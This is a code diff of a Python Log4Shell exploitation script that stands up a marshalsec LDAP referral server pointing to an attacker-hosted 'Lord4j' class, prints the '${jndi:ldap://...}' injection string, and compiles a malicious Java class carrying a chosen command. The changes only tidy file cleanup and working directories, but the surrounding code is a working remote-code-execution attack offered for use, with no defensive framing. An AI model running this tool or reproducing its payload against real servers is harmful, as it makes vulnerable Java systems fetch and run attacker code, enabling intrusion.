@@ -16,6 +16,11 @@ ip = args.ip
 command = args.command
 rip = args.rip
 
+if os.path.exists("Lord4j.java"):
+	os.remove("Lord4j.java")
+if os.path.exists("Lord4j.class"):
+    os.remove("Lord4j.class")
+
 oldd = os.getcwd()
 
 banner = f"""{Fore.RED}
@@ -110,20 +115,20 @@ def deploy_ldap_server(ip):
 	else:
 		print(f"[{Fore.GREEN}SUCCESS{Style.RESET_ALL}] LDAP server already installed !")
 	
-	os.chdir('marshalsec-master/target')
- 
 	ldap_server = subprocess.Popen(
 		f'java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://{ip}:8000/#Lord4j"',
 		shell=True,
 		stdout=subprocess.PIPE,
 		stderr=subprocess.PIPE,
 		stdin=subprocess.DEVNULL,
-		executable="/bin/bash")
-
+		executable="/bin/bash",
+		cwd = 'marshalsec-master/target'
+  )
+ 
 	exploit_cmd = "${jndi:ldap://" + ip + ":1389/Lord4j}"
 	print(f"[{Fore.RED}EXPLOIT{Style.RESET_ALL}] Your exploitation string will be : {exploit_cmd} [{Fore.RED}EXPLOIT{Style.RESET_ALL}]")
 
-	os.chdir(oldd)
+	
 
 	while True:
 		output = ldap_server.stdout.readline()
@@ -172,7 +177,6 @@ def forge_exploit(cmd):
 	print(f"[{Fore.BLUE}INFO{Style.RESET_ALL}] Building exploit..")
 	jclass.wait()
 	print(f"[{Fore.GREEN}SUCCESS{Style.RESET_ALL}] Exploit built!")
-	os.remove("Lord4j.java")
  
 print(banner)
 
